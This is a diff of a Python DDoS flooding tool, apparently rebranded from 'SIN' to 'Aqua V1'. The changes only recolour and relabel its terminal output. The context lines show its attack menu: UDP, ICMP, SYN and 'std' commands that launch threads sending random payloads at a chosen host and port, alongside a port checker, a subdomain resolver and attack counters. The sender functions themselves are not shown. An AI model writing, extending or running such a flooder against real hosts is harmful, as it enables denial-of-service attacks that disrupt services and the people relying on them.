@@ -243,7 +243,7 @@ def main():
 
 	while True:
 		sys.stdout.write("\x1b]2;Devices: 5 | Aqua V1\x07")
-		sin = input("\033[38;2;253;239;249m[\033[38;2;253;239;249mAQUA\033[1;00m]-\033[91m家\033[00m ").lower()
+		sin = input("\033[38;2;253;239;249m[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m]-\033[38;2;59;2;111m家\033[00m ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -278,7 +278,7 @@ def main():
 				try:
 					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 					sock.connect((ip, port))
-					print ("[\033[91mSIN\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
 					sock.close()
 				except socket.error:
 					return
@@ -294,11 +294,11 @@ def main():
 			print (info)
 			main()
 		elif sinput == "attacks":
-			print ("\n[\033[91mSIN\033[00m] UPD Running processes: {}".format (uaid))
-			print ("[\033[91mSIN\033[00m] ICMP Running processes: {}".format (iaid))
-			print ("[\033[91mSIN\033[00m] SYN Running processes: {}".format (said))
-			print ("[\033[91mSIN\033[00m] STD Running Processes: {}".format (said))
-			print ("[\033[91mSIN\033[00m] Total attacks running: {}\n".format (aid))
+			print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] UPD Running processes: {}".format (uaid))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] ICMP Running processes: {}".format (iaid))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] SYN Running processes: {}".format (said))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] STD Running Processes: {}".format (said))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Total attacks running: {}\n".format (aid))
 			main()
 		elif sinput == "dnsresolve":
 			sfound = 0
@@ -311,14 +311,14 @@ def main():
 					try:
 						url = link.strip() + "." + host
 						subips = socket.gethostbyname(url)
-						print ("[\033[91mSIN\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
+						print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
 						sfound += 1
 						fsubs += 1
 						sys.stdout.write("\x1b]2;A Q U A |{}| F O U N D\x07".format (sfound))
 					except socket.error:
 						pass
-						#print ("[\033[91mSIN\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
-				print ("[\033[91mSIN\033[00m] Task complete | found: {}".format(sfound))
+						#print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Task complete | found: {}".format(sfound))
 				main()
 			except IndexError:
 				print ('ADD THE HOST!')
@@ -326,17 +326,17 @@ def main():
 			liips += 1
 			host = sin.split(" ")[1]
 			host_ip = socket.gethostbyname(host)
-			print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
 			main()
 		elif sinput == "ping":
 			tpings += 1
 			try:
 				sinput, host, port = sin.split(" ")
-				print ("[\033[91mSIN\033[00m] Starting ping on host: {}".format (host))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Starting ping on host: {}".format (host))
 				try:
 					ip = socket.gethostbyname(host)
 				except socket.gaierror:
-					print ("[\033[91mSIN\033[00m] Host un-resolvable")
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host un-resolvable")
 					main()
 				while True:
 					try:
@@ -357,11 +357,11 @@ def main():
 						print("")
 						main()
 			except ValueError:
-				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 				main()
 		elif sinput == "udp":
 			if username == "guests":
-				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] You are not allowed to use this method")
 				main()
 			else:
 				try:
@@ -371,10 +371,10 @@ def main():
 					punch = random._urandom(int(pack))
 					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host: {} invalid".format (host))
 					main()
 		elif sinput == "std":
 			try:
@@ -384,14 +384,14 @@ def main():
 				punch = random._urandom(int(pack))
 				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host: {} invalid".format (host))
 				main()
 		elif sinput == "icmp":
 			if username == "guests":
-				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] You are not allowed to use this method")
 				main()
 			else:
 				try:
@@ -401,10 +401,10 @@ def main():
 					punch = random._urandom(int(pack))
 					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host: {} invalid".format (host))
 					main()
 		elif sinput == "syn":
 			try:
@@ -414,10 +414,10 @@ def main():
 				punch = random._urandom(int(pack))
 				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
+				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Host: {} invalid".format (host))
 				main()
 		elif sinput == "stopattacks":
 			attack = False
@@ -431,18 +431,18 @@ def main():
 				udp = False
 				while not udp:
 					if aid == 0:
-						print ("[\033[91mSIN\033[00m] No udp Processes running.")
+						print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] No udp Processes running.")
 						udp = True
 						main()
 			if what == "icmp":
 				print ("Stopping all icmp attacks")
 				icmp = False
 				while not icmp:
-					print ("[\033[91mSIN\033[00m] No ICMP processes running")
+					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] No ICMP processes running")
 					udp = True
 					main()
 		else:
-			print ("[\033[91mSIN\033[00m] {} Not a command".format(sinput))
+			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] {} Not a command".format(sinput))
 			main()
 
 
@@ -474,7 +474,7 @@ try:
 				print (banner)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
+				print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] CTRL has been pressed")
 				main()
 		else:
 			print ("[+] Incorrect, exiting")
@@ -490,7 +490,7 @@ try:
 				print (banner)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
+				print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] CTRL has been pressed")
 				main()
 		else:
 			print ("[+] Incorrect, exiting")
